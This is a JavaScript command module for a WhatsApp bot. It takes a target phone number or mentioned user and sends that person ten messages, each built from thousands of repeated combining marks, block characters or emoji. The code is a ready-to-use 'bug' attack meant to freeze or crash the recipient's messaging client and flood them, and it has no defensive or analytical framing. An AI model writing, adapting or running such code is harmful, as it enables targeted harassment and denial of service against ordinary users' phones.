const payloads = [
    "ꦾ".repeat(5000),
    "҈".repeat(5000),
    "ॣ".repeat(5000),
    "⃢".repeat(5000),
    "⃟".repeat(5000),
    "⃠".repeat(5000),
    "⃡".repeat(5000),
    "⃢".repeat(5000),
    "░".repeat(10000),
    "⚰️".repeat(5000),
    "💥".repeat(5000),
    "💀".repeat(5000),
    "🔥".repeat(5000),
    "🌪️".repeat(5000),
    "🌊".repeat(5000),
    "🌋".repeat(5000),
    "🌈".repeat(5000),
    "🌀".repeat(5000),
    "🎭".repeat(5000),
    "🚀".repeat(5000)
];

async function powerfulBugCommand(sock, from, msg, isOwner, q) {
    if (!isOwner) return sock.sendMessage(from, { text: "❌ Owner only command!" }, { quoted: msg });
    
    let target = q ? q.split(' ')[0] : null;
    if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
        target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
    } else if (msg.message.extendedTextMessage?.contextInfo?.participant) {
        target = msg.message.extendedTextMessage.contextInfo.participant;
    }
    
    if (!target) return sock.sendMessage(from, { text: "❌ Please mention or provide a target number!" }, { quoted: msg });
    if (!target.endsWith('@s.whatsapp.net')) target += '@s.whatsapp.net';

    await sock.sendMessage(from, { text: `🚀 *Sending Powerful Bug to:* ${target.split('@')[0]}\n⚠️ *Use with caution!*` }, { quoted: msg });

    for (let i = 0; i < 10; i++) {
        const payload = payloads[Math.floor(Math.random() * payloads.length)];
        await sock.sendMessage(target, { text: payload });
        await new Promise(resolve => setTimeout(resolve, 500));
    }

    await sock.sendMessage(from, { text: "✅ *Powerful Bug Sent Successfully!*" }, { quoted: msg });
}

module.exports = powerfulBugCommand;
